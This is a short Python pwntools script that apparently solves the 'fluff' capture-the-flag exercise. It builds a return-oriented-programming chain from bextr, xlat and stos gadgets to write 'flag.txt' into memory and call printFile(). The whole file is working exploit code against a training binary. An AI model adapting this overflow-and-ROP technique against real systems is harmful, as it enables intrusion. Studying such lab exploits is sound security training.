#!/usr/bin/python3
#coding: utf-8

from pwn import *
import sys

"""

0x40062a: pop rdx;
		  pop rcx; add rcx, 0x3ef2;

0x400633: bextr rbx, rcx, rdx; ret;

	rdx = 0x4000 : extract 64 bits starting a 0 from rcx to rbx

	>>> bin(0x4000)
	'0b100000000000000'
	
	>>> 0b100000000000000 >> 8
	64

	rdx [7:0] : départ
	rdx [15:8]: nb de bits à extraire


0x400628: xlat BYTE PTR ds:[rbx]      === mov al, PTR [rbx + al]

0x4006a3: pop rdi; ret;
0x400639: stos BYTE PTR es:[rdi],al   === mov PTR [rdi], al

# search char with pwndbg
pwndbg> search -1 0x6c fluff

chr(0x6c) = 'l'

"""

def setup_rbx(rbx_value):
	
	# 0x40062a: pop rdx;
	# pop rcx; add rcx, 0x3ef2;
	ropchain = p64(0x40062a)
	
	ropchain += p64(0x4000) # rdx
	ropchain += p64(rbx_value - 0x3ef2) 

	ropchain += p64(0x400633) # bextr rbx, rcx, rdx; ret;

	return ropchain


# setup $al by passing the address of the value
# we want to write

def setup_al(al_ptr) :
	ropchain = setup_rbx(0x601080)	# an address with null values
									# we use values in .data to clear al

	# 0x400628: xlat BYTE PTR ds:[rbx] === mov al, PTR [rbx + al]
	ropchain += p64(0x400628)

	ropchain += setup_rbx(al_ptr)

	# 0x400628: xlat BYTE PTR ds:[rbx] === mov al, PTR [rbx + al]
	ropchain += p64(0x400628)

	return ropchain


def copy_byte(dest_addr, src_addr):

	ropchain = setup_al(src_addr)

	# 0x4006a3: pop rdi; ret;
	# 0x400639: stos BYTE PTR es:[rdi],al   === mov PTR [rdi], al

	ropchain += p64(0x4006a3) # pop rdi
	ropchain += p64(dest_addr)

	ropchain += p64(0x400639) # stos === mov PTR [rdi], al

	return ropchain


"""
### MAIN ###
"""
buf  = b'A' * 40 #padding
#buf += setup_al(0x4003c4)

# Write "flag.txt" in memory at 0x601030

buf += copy_byte(0x601030,0x4003c4) # char 'f'
buf += copy_byte(0x601031,0x400239) # char 'l'
buf += copy_byte(0x601032,0x40040c) # char 'a'
buf += copy_byte(0x601033,0x6003cf) # char 'g'
buf += copy_byte(0x601034,0x40024e) # char '.'
buf += copy_byte(0x601035,0x4003d5) # char 't'
buf += copy_byte(0x601036,0x4006c8) # char 'x'
buf += copy_byte(0x601037,0x4003d5) # char 't'

buf += p64(0x4006a3) # pop rdi
buf += p64(0x601030)

buf += p64(0x400510) # printFile()

sys.stdout.buffer.write(buf)
